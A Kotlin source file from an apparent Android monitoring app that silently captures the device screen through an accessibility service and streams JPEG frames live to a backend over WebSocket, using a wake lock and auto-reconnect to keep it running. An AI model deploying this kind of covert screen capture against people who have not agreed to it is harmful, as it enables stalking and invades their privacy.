package com.spapp.monitoring.screenstream

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.graphics.Bitmap
import android.os.Build
import android.os.PowerManager
import android.os.SystemClock
import android.util.Log
import android.view.Display
import androidx.annotation.RequiresApi
import com.spapp.monitoring.BuildConfig
import com.spapp.monitoring.blocking.BlockAccessibilityService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import kotlinx.coroutines.suspendCancellableCoroutine
import kotlinx.coroutines.withTimeoutOrNull
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import okio.ByteString.Companion.toByteString
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.coroutines.resume

/**
 * Manages high-performance, low-latency live screen streaming from the Android device
 * to the backend WebSocket relay.
 *
 * Resilience & Continuity Guidelines:
 * 1. Pure video stream: No audio recording or microphone usage.
 * 2. Dedicated screenshot executor: Isolates takeScreenshot callbacks to a background thread
 *    so UI thread activity (e.g. scrolling Instagram reels or app switches) never delays capture.
 * 3. Resilient Auto-Reconnect: If a socket failure occurs during app switching or network transitions,
 *    it does NOT abort streaming; it automatically reconnects with backoff.
 * 4. Safe hardware bitmap conversion: Converts hardware bitmaps cleanly to software RGB_565/ARGB_8888.
 * 5. Window transition resilience: Catches transient window animation error codes (code 1 / code 3)
 *    smoothly without locking the capture loop.
 * 6. Non-blocking queue: Drops frame only if WebSocket outgoing buffer backs up (> 128 KB).
 */
object ScreenStreamManager {

    private const val TAG = "ScreenStreamManager"
    private const val DEFAULT_CAPTURE_INTERVAL_MS = 200L // Fast 5 FPS default target
    private const val AOSP_FALLBACK_INTERVAL_MS = 334L   // AOSP fallback rate limit (~3 FPS)
    private const val TARGET_MAX_DIMENSION = 720         // Crisp 720p max dimension (~25KB payload)
    private const val JPEG_QUALITY = 50                  // Optimal balance of crispness & low byte size
    private const val MAX_WS_QUEUE_BYTES = 64 * 1024L    // 64 KB low-latency buffer headroom

    // Packet type indicator for video JPEG
    private const val PACKET_TYPE_VIDEO: Byte = 0x01

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val screenshotExecutor = Executors.newSingleThreadExecutor()

    private var streamJob: Job? = null
    private var reconnectJob: Job? = null
    private var activeWebSocket: WebSocket? = null
    private var wakeLock: PowerManager.WakeLock? = null
    private val isStreaming = AtomicBoolean(false)
    private val isEncoding = AtomicBoolean(false)
    private var currentCaptureIntervalMs = DEFAULT_CAPTURE_INTERVAL_MS
    private var successfulCaptures = 0

    private var currentAuthToken: String? = null
    private var currentDeviceId: String? = null
    private var onStreamStoppedCallback: (() -> Unit)? = null

    private val wsBaseUrl: String by lazy {
        BuildConfig.API_BASE_URL
            .replaceFirst("http://", "ws://")
            .replaceFirst("https://", "wss://")
            .trimEnd('/')
    }

    @Synchronized
    fun startStreaming(
        context: Context,
        authToken: String,
        deviceId: String,
        onStreamStopped: (() -> Unit)? = null
    ) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            Log.w(TAG, "Screen streaming requires Android 11+ (API 30+)")
            return
        }

        currentAuthToken = authToken
        currentDeviceId = deviceId
        onStreamStoppedCallback = onStreamStopped

        // If a stream session is already actively running and connected, keep running
        if (isStreaming.get() && activeWebSocket != null) {
            Log.d(TAG, "Screen stream session is already active — updating credentials")
            return
        }

        // Cancel previous reconnect job if any
        reconnectJob?.cancel()
        reconnectJob = null

        isStreaming.set(true)

        // Acquire partial WakeLock to prevent CPU sleep while live streaming
        try {
            val powerManager = context.getSystemService(Context.POWER_SERVICE) as? PowerManager
            if (wakeLock == null || wakeLock?.isHeld == false) {
                wakeLock = powerManager?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "spapp:ScreenStreamWakeLock")?.apply {
                    setReferenceCounted(false)
                    acquire(20 * 60 * 1000L) // 20 minutes safety auto-release
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to acquire WakeLock", e)
        }

        connectWebSocket(context.applicationContext)
    }

    private fun connectWebSocket(appContext: Context) {
        val authToken = currentAuthToken ?: return
        val deviceId = currentDeviceId ?: return

        if (!isStreaming.get()) return

        val client = OkHttpClient.Builder()
            .readTimeout(0, TimeUnit.MILLISECONDS)
            .pingInterval(8, TimeUnit.SECONDS)
            .retryOnConnectionFailure(true)
            .build()

        val url = "$wsBaseUrl/ws/screen-stream?role=device&token=$authToken&deviceId=$deviceId"
        val request = Request.Builder().url(url).build()

        Log.d(TAG, "Connecting screen stream WebSocket...")
        client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.d(TAG, "Screen stream WebSocket connected (pure video mode)")
                activeWebSocket = webSocket
                try {
                    val isA11yBound = BlockAccessibilityService.instance != null
                    val a11yEnabled = com.spapp.monitoring.blocking.AccessibilityStatus.isEnabled(appContext)
                    val isReady = isA11yBound || a11yEnabled
                    webSocket.send(JSONObject(mapOf(
                        "type" to "status",
                        "status" to if (isReady) "device_ready" else "waiting_a11y",
                        "message" to if (isReady) "Device ready for screen stream" else "Accessibility service not running (please toggle in Settings)",
                        "a11yBound" to isA11yBound,
                        "a11yEnabled" to a11yEnabled
                    )).toString())
                } catch (_: Exception) {}
                startCaptureLoop(appContext, webSocket)
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                try {
                    val json = JSONObject(text)
                    if (json.optString("action") == "stop") {
                        Log.d(TAG, "Received stop signal from relay/admin")
                        stopStreaming()
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing WS message", e)
                }
            }

            override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
                Log.d(TAG, "WebSocket closing: $code / $reason")
                if (code == 1000 || !isStreaming.get()) {
                    if (activeWebSocket == webSocket) {
                        stopStreaming()
                    }
                } else {
                    scheduleReconnect(appContext, webSocket)
                }
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "WebSocket failure: ${t.message}, response code: ${response?.code}")
                if (isStreaming.get()) {
                    scheduleReconnect(appContext, webSocket)
                } else {
                    if (activeWebSocket == webSocket) {
                        stopStreaming()
                    }
                }
            }
        })
    }

    private fun scheduleReconnect(appContext: Context, failedWs: WebSocket?) {
        if (!isStreaming.get()) return

        if (activeWebSocket == failedWs || activeWebSocket == null) {
            activeWebSocket = null
            streamJob?.cancel()
            streamJob = null

            try {
                failedWs?.close(1001, "reconnecting")
            } catch (_: Exception) {}

            reconnectJob?.cancel()
            reconnectJob = scope.launch {
                Log.d(TAG, "Scheduling screen stream auto-reconnect in 1500ms...")
                delay(1500L)
                if (isStreaming.get() && activeWebSocket == null) {
                    Log.d(TAG, "Attempting screen stream reconnection...")
                    connectWebSocket(appContext)
                }
            }
        }
    }

    @Synchronized
    fun stopStreaming() {
        if (!isStreaming.getAndSet(false)) {
            val ws = activeWebSocket
            activeWebSocket = null
            try {
                ws?.close(1000, "stream stopped")
            } catch (_: Exception) {}
            return
        }

        Log.d(TAG, "Stopping screen stream")
        isEncoding.set(false)
        currentCaptureIntervalMs = DEFAULT_CAPTURE_INTERVAL_MS
        successfulCaptures = 0
        reconnectJob?.cancel()
        reconnectJob = null

        streamJob?.cancel()
        streamJob = null

        val ws = activeWebSocket
        activeWebSocket = null
        try {
            ws?.close(1000, "stream stopped")
        } catch (_: Exception) {}

        try {
            if (wakeLock?.isHeld == true) {
                wakeLock?.release()
            }
        } catch (_: Exception) {}
        wakeLock = null

        val cb = onStreamStoppedCallback
        onStreamStoppedCallback = null
        cb?.invoke()
    }

    private fun startCaptureLoop(context: Context, ws: WebSocket) {
        streamJob?.cancel()
        streamJob = scope.launch(Dispatchers.Default) {
            Log.d(TAG, "High-performance silent capture loop started (target: ${currentCaptureIntervalMs}ms)")
            var lastCaptureStartTime = 0L

            while (isActive && isStreaming.get() && activeWebSocket == ws) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    val now = SystemClock.uptimeMillis()
                    val elapsed = now - lastCaptureStartTime
                    if (elapsed < currentCaptureIntervalMs) {
                        delay(currentCaptureIntervalMs - elapsed)
                    }

                    // Drop frame tick if previous frame is still encoding or network buffer is congested
                    if (isEncoding.get() || ws.queueSize() > MAX_WS_QUEUE_BYTES) {
                        delay(25L)
                        continue
                    }

                    lastCaptureStartTime = SystemClock.uptimeMillis()

                    // Safety timeout prevents the loop from ever freezing if an OS window transition stalls
                    withTimeoutOrNull(2500L) {
                        captureFrameSequential(context, ws)
                    }
                } else {
                    break
                }
            }
            Log.d(TAG, "Capture loop ended")
        }
    }

    @RequiresApi(Build.VERSION_CODES.R)
    private suspend fun captureFrameSequential(context: Context, ws: WebSocket) {
        var service = BlockAccessibilityService.instance
        if (service == null) {
            val a11yEnabled = com.spapp.monitoring.blocking.AccessibilityStatus.isEnabled(context)
            if (a11yEnabled) {
                // Gracefully wait up to 3 seconds for service instance to rebind or finish app transition
                for (i in 0 until 15) {
                    delay(200L)
                    service = BlockAccessibilityService.instance
                    if (service != null) break
                }
            }
        }

        if (service == null) {
            val isEnabledInSettings = com.spapp.monitoring.blocking.AccessibilityStatus.isEnabled(context)
            Log.w(TAG, "BlockAccessibilityService not active (setting in Settings: $isEnabledInSettings)")
            // ONLY notify waiting_a11y if user genuinely disabled the setting in Android OS
            if (!isEnabledInSettings) {
                try {
                    ws.send(JSONObject(mapOf(
                        "type" to "status",
                        "status" to "waiting_a11y",
                        "message" to "Accessibility service not active (please enable Accessibility in Settings)"
                    )).toString())
                } catch (_: Exception) {}
            }
            delay(1000L)
            return
        }

        suspendCancellableCoroutine<Unit> { continuation ->
            try {
                service.takeScreenshot(
                    Display.DEFAULT_DISPLAY,
                    screenshotExecutor,
                    object : AccessibilityService.TakeScreenshotCallback {
                        override fun onSuccess(screenshotResult: AccessibilityService.ScreenshotResult) {
                            val hardwareBuffer = screenshotResult.hardwareBuffer
                            val colorSpace = screenshotResult.colorSpace

                            scope.launch(Dispatchers.Default) {
                                isEncoding.set(true)
                                try {
                                    val hwBitmap = try {
                                        Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
                                    } catch (e: Throwable) {
                                        Log.e(TAG, "Failed wrapHardwareBuffer", e)
                                        null
                                    }

                                    var jpegBytes: ByteArray? = null

                                    if (hwBitmap != null) {
                                        // Hardware bitmaps reside in GPU memory and cannot be directly drawn to a software
                                        // Canvas or compressed. Copy to software ARGB_8888 first, then scale and compress.
                                        val swBitmap = try {
                                            hwBitmap.copy(Bitmap.Config.ARGB_8888, false)
                                        } catch (e: Throwable) {
                                            Log.e(TAG, "Failed copy from hardware to software bitmap", e)
                                            null
                                        }

                                        try {
                                            hwBitmap.recycle()
                                        } catch (_: Throwable) {}

                                        if (swBitmap != null) {
                                            val width = swBitmap.width
                                            val height = swBitmap.height
                                            val maxDim = TARGET_MAX_DIMENSION

                                            val scale = if (maxOf(width, height) > maxDim) {
                                                maxDim.toFloat() / maxOf(width, height)
                                            } else {
                                                1.0f
                                            }
                                            val dstWidth = (width * scale).toInt().coerceAtLeast(1)
                                            val dstHeight = (height * scale).toInt().coerceAtLeast(1)

                                            val finalBitmap = if (scale < 1.0f) {
                                                try {
                                                    val scaled = Bitmap.createScaledBitmap(swBitmap, dstWidth, dstHeight, true)
                                                    if (scaled != swBitmap) {
                                                        swBitmap.recycle()
                                                    }
                                                    scaled
                                                } catch (e: Throwable) {
                                                    Log.e(TAG, "Failed createScaledBitmap, using full-size bitmap", e)
                                                    swBitmap
                                                }
                                            } else {
                                                swBitmap
                                            }

                                            try {
                                                val swOut = ByteArrayOutputStream(32 * 1024)
                                                finalBitmap.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, swOut)
                                                finalBitmap.recycle()
                                                jpegBytes = swOut.toByteArray()
                                            } catch (e: Throwable) {
                                                Log.e(TAG, "Failed compressing bitmap to JPEG", e)
                                                try { finalBitmap.recycle() } catch (_: Throwable) {}
                                            }
                                        }
                                    }

                                    if (jpegBytes != null && jpegBytes.isNotEmpty()) {
                                        if (isStreaming.get() && activeWebSocket == ws && ws.queueSize() <= MAX_WS_QUEUE_BYTES) {
                                            val packet = ByteArray(1 + jpegBytes.size)
                                            packet[0] = PACKET_TYPE_VIDEO
                                            System.arraycopy(jpegBytes, 0, packet, 1, jpegBytes.size)
                                            ws.send(packet.toByteString())
                                            successfulCaptures++
                                            if (successfulCaptures > 30 && currentCaptureIntervalMs > DEFAULT_CAPTURE_INTERVAL_MS) {
                                                currentCaptureIntervalMs = DEFAULT_CAPTURE_INTERVAL_MS
                                                successfulCaptures = 0
                                            }
                                        }
                                    } else {
                                        Log.w(TAG, "Failed to produce JPEG bytes for screenshot frame")
                                    }
                                } catch (e: Exception) {
                                    Log.e(TAG, "Error encoding frame", e)
                                } finally {
                                    try {
                                        hardwareBuffer.close()
                                    } catch (_: Throwable) {}
                                    isEncoding.set(false)
                                    // Resume capture loop only after hardwareBuffer is safely closed and frame is dispatched!
                                    if (continuation.isActive) continuation.resume(Unit)
                                }
                            }
                        }

                        override fun onFailure(errorCode: Int) {
                            Log.w(TAG, "takeScreenshot failure code: $errorCode")
                            if (errorCode == AccessibilityService.ERROR_TAKE_SCREENSHOT_INTERVAL_TIME_SHORT) {
                                // Adaptive backoff: device enforces AOSP ~334ms rate limit
                                currentCaptureIntervalMs = AOSP_FALLBACK_INTERVAL_MS
                                successfulCaptures = 0
                            }
                            scope.launch(Dispatchers.Default) {
                                delay(if (errorCode == AccessibilityService.ERROR_TAKE_SCREENSHOT_INTERVAL_TIME_SHORT) 80L else 150L)
                                if (continuation.isActive) continuation.resume(Unit)
                            }
                        }
                    }
                )
            } catch (e: Exception) {
                Log.e(TAG, "Failed to invoke takeScreenshot", e)
                if (continuation.isActive) continuation.resume(Unit)
            }
        }
    }
}